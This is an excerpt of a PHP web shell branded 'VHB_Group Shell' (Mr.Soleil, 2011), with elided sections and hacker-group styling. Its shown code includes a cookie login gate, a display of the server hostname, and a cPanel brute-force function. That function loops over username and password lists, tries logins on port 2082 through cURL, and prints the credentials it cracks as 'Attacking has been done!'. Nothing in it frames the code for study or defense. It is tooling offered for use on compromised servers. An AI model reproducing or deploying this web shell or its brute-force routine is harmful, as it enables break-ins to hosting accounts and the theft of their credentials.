...
|*    VHB_Group Shell - VERSION 9.9	*|

|*     Edit & Develop by Mickey VHB_Group        *|
...
if ($action == "logout") {
    ...
    p('<body background=http://i1124.photobucket.com/albums/l575/givay/th_matrix.gif>');
    exit;
}
    if ($_COOKIE['vbapass']) {
...
<title><?php echo str_replace('.', '', 'Mr.Soleil - VHB_Group'); ?></title>
...
<table width="100%" border="0" cellpadding="0" cellspacing="0">
	...
	<tr class="head_small">
		...
		<table width=100%><tr class="head_small"><td  width=86px><a title="Mr.Soleil - VHB_Group" href="<?php $self; ?>"><img src=https://i.imgur.com/lAGPawF.png width="106" height=86 border=0></a></td>

		<td>

		<span style="float:right;"> <?php echo "Hostname: " . $_SERVER['HTTP_HOST'] . ""; ?>  | <a href="#" target="_blank"><a href="#" target="_blank"><?php echo str_replace('.', '', '[Fuck-by:Mr.Soleil VHB_Group]'); ?></a> [wWw]</a> | <a href="javascript:goaction('logout');"><font color=red>Logout</font></a></span>
...
<b> Attacking has been done! Username: <font color='#FF0000'> $user </font> / Password:<font color='#FF0000'> $pass </font> => <a href=http://$user:$pass@$host:2082 target=_blank>Login</a></b><br>");
    ...
    function cpanel_check($host, $user, $pass, $timeout) {
        ...
        if (curl_errno($ch) == 28) {
            ...
            p("<b>[ ducdung.08clc@gmail.com ]# </b><b>Attacking has been done!</a> Username: <font color='#FF0000'> $user </font> / Password:<font color='#FF0000'> $pass </font></b><br>");
        }
        curl_close($ch);
    }
    if (isset($submit) && !empty($submit)) {
        $userlist = explode("\n", $users);
        $passlist = explode("\n", $pass);
        p('<b>[ ducdung.08clc@gmail.com ]# Attacking ...</font></b><br>');
...
ob_end_flush(); ?></span>
	...
	Copyright (C) 2011 <B>[Mr.Soleil]</B> - Develop by <a href=# target=_blank><B>VHB_Group-</B></a> All Rights Reserved.</div>
...
<body bgcolor=black background=http://i1124.photobucket.com/albums/l575/givay/th_matrix.gif>



		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

<title>Mr.Soleil VHB_Group</title>
...
<font color=yellow>==[ <B>SHELL-VHB_Group</B> ]== </font><BR><BR>
...
<a href=#>HACKING - SECURITY - PROGRAMMING</a><BR></b> <br>

	<B><font color=red>

<a href=> Edit & Develop by Mr.Soleil - VHB_Group  </a><BR></b></br>

	<B><font color=blue>

<a href=http://vhbgroup.net>vhbgroup.net</a><BR></b>
